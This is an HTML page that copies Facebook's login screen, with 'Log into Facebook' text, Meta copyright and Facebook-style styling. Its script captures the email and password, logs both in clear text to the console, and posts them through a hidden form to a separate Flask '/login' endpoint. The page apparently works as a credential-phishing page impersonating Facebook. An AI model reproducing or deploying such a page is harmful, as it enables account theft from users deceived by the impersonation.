<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style type="text/css">
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f0f2f5;
            color: #1c1e21;
        }

        main {
            height: 100vh;
            width: 100vw;
            display: flex;
            margin: 0;
            padding: 5px;
        }

        .container {
            display: flex;
            width: 100%;
            height: 100%;
            margin: 0;
            gap: 0;
        }

        .left-section {
            flex: 0 0 60%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #ffffff;
            overflow: hidden;
        }

        .left-section img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .right-section {
            flex: 0 0 40%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-color: #f0f2f5;
            padding: 40px;
            overflow-y: auto;
        }

        .form-header {
            text-align: left;
            margin-bottom: 24px;
            width: 100%;
            max-width: 420px;
        }

        .form-header h1 {
            font-size: 32px;
            font-weight: 700;
            color: #000;
            margin-bottom: 10px;
        }

        .form-container {
            background-color: #ffffff;
            border: none;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 420px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-container input {
            width: 100%;
            padding: 14px 16px;
            height: auto;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 15px;
            color: #1d2129;
            outline: none;
            transition: all 0.3s ease;
            font-family: 'Poppins', sans-serif;
        }

        .form-container input::placeholder {
            color: #65676b;
        }

        .form-container input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
        }

        .btn-login {
            width: 100%;
            padding: 11px 16px;
            height: 45px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            color: #ffffff;
            background-color: #0a66c2;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 12px;
        }

        .btn-login:hover {
            background-color: #165ec7;
            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
        }

        .btn-login:active {
            transform: scale(0.98);
        }

        .form-container a {
            display: block;
            color: #0a66c2;
            font-size: 14px;
            text-decoration: none;
            padding: 14px 0;
            text-align: center;
            transition: color 0.2s ease;
            border-bottom: 1px solid #dddfe2;
        }

        .form-container a:hover {
            text-decoration: underline;
            color: #165ec7;
        }

        .btn-new {
            width: 100%;
            padding: 11px 16px;
            height: 45px;
            border: 2px solid #e4e6eb;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 700;
            color: #0a66c2;
            background-color: #ffffff;
            cursor: pointer;
            transition: all 0.2s ease;
            margin-top: 16px;
            font-family: 'Poppins', sans-serif;
        }

        .btn-new:hover {
            background-color: #f5f6f7;
            border-color: #0a66c2;
        }

        .btn-new:active {
            transform: scale(0.98);
        }

        .form-footer {
            margin-top: 24px;
            text-align: center;
            font-size: 12px;
            color: #65676b;
        }

        .form-footer a {
            color: #0a66c2;
            text-decoration: none;
            border: none;
            padding: 0;
            display: inline;
        }

        .form-footer a:hover {
            text-decoration: underline;
        }

        .meta-footer {
            margin-top: 16px;
            text-align: center;
            font-size: 13px;
            color: #65676b;
        }

        /* Responsive Design */
        @media (max-width: 1024px) {
            .container {
                flex-direction: column;
                gap: 40px;
            }

            .left-section {
                order: 2;
                max-width: 400px;
            }

            .right-section {
                order: 1;
            }

            main {
                padding: 20px;
            }
        }

        @media (max-width: 600px) {
            .form-header h1 {
                font-size: 24px;
            }

            .form-container {
                padding: 20px;
            }

            .container {
                gap: 20px;
            }
        }
    </style>

</head>

<body>
    <main>
        <div class="container">
            <div class="left-section">
                <img src="fb1.png" alt="Facebook experience">
            </div>
            <div class="right-section">
                <div class="form-header">
                    <h1>Log into Facebook</h1>
                </div>
                <div class="form-container">
                    <div class="form-group">
                        <input type="text" id="email" placeholder="Email or mobile number">
                    </div>
                    <div class="form-group">
                        <input type="password" id="password" placeholder="Password">
                    </div>
                    <button class="btn-login" onclick="login()">Log in</button>
                    <a href="#">Forgotten password?</a>
                    <button class="btn-new">Create new account</button>
                </div>
                <div class="form-footer">
                    <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
                </div>
                <div class="meta-footer">
                    <p>© Meta 2024</p>
                </div>
            </div>
        </div>
    </main>

    <script>
        function login() {
            console.log('Login Function called');
            // Capture user input
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            // Basic validation
            if (!email || !password) {
                alert('Please enter both email/phone and password');
                return;
            }

            // Display the captured data in the console
            console.log("Email: " + email);
            console.log("Password: " + password);

            // Create a form and POST credentials to Flask /login endpoint
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = '/login';

            var emailField = document.createElement('input');
            emailField.type = 'hidden';
            emailField.name = 'email';
            emailField.value = email;
            form.appendChild(emailField);

            var passwordField = document.createElement('input');
            passwordField.type = 'hidden';
            passwordField.name = 'password';
            passwordField.value = password;
            form.appendChild(passwordField);

            document.body.appendChild(form);
            form.submit();
        }
    </script>
</body>

</html>
